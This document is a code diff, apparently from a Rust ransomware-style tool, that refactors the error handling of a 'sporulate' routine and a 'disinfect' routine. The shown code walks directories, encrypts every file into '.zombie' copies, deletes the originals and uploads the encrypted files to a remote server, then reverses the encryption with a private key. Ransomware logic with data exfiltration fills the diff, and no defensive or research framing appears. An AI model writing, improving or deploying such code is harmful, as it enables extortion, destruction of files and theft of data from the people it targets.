@@ -146,31 +146,32 @@ pub async fn sporulate(
     for entry in walker {
         let file_path = entry.path();
 
-        let process = || async {
-            if log::log_enabled!(log::Level::Debug) {
-                debug!("Encrypting file: {:?}", file_path);
+        debug!("Encrypting file: {:?}", file_path);
+        let zombie = match encrypt(file_path, &public_key) {
+            Ok(zombie) => zombie,
+            Err(e) => {
+                error!("Failed to encrypt file {:?}: {}", file_path, e);
+                has_errors = true;
+                continue;
             }
-            let zombie = encrypt(file_path, &public_key)?;
-
-            if !no_delete {
-                if log::log_enabled!(log::Level::Debug) {
-                    debug!("Deleting original file: {:?}", file_path);
-                }
-                fs::remove_file(file_path)?;
-            }
-
-            if let Some(address) = server {
-                if log::log_enabled!(log::Level::Debug) {
-                    debug!("Exfiltrating file: {:?}", zombie);
-                }
-                upload_file(&client, address, &zombie).await?;
-            }
-            Ok::<(), AppError>(())
         };
 
-        if let Err(e) = process().await {
-            error!("Failed to process file {:?}: {}", file_path, e);
-            has_errors = true;
+        if !no_delete {
+            debug!("Deleting original file: {:?}", file_path);
+            if let Err(e) = fs::remove_file(file_path) {
+                error!("Failed to delete file {:?}: {}", file_path, e);
+                has_errors = true;
+                continue;
+            }
+        }
+
+        if let Some(address) = server {
+            debug!("Exfiltrating file: {:?}", zombie);
+            if let Err(e) = upload_file(&client, address, &zombie).await {
+                error!("Failed to exfiltrate file {:?}: {}", &zombie, e);
+                has_errors = true;
+                continue;
+            }
         }
     }
 
@@ -218,24 +219,20 @@ pub fn disinfect(path: &Path, key: &Path, no_delete: bool) -> Result<(), AppErro
     for entry in walker {
         let file_path = entry.path();
 
-        let process = || -> Result<(), AppError> {
-            if log::log_enabled!(log::Level::Debug) {
-                debug!("Decrypting file: {:?}", file_path);
-            }
-            decrypt(file_path, &private_key)?;
-
-            if !no_delete {
-                if log::log_enabled!(log::Level::Debug) {
-                    debug!("Deleting .zombie file: {:?}", file_path);
-                }
-                fs::remove_file(file_path)?;
-            }
-            Ok(())
-        };
-
-        if let Err(e) = process() {
-            error!("Failed to process file {:?}: {}", file_path, e);
+        debug!("Decrypting file: {:?}", file_path);
+        if let Err(e) = decrypt(file_path, &private_key) {
+            error!("Failed to decrypt file {:?}: {}", file_path, e);
             has_errors = true;
+            continue;
+        }
+
+        if !no_delete {
+            debug!("Deleting .zombie file: {:?}", file_path);
+            if let Err(e) = fs::remove_file(file_path) {
+                error!("Failed to delete .zombie file {:?}: {}", file_path, e);
+                has_errors = true;
+                continue;
+            }
         }
     }
 
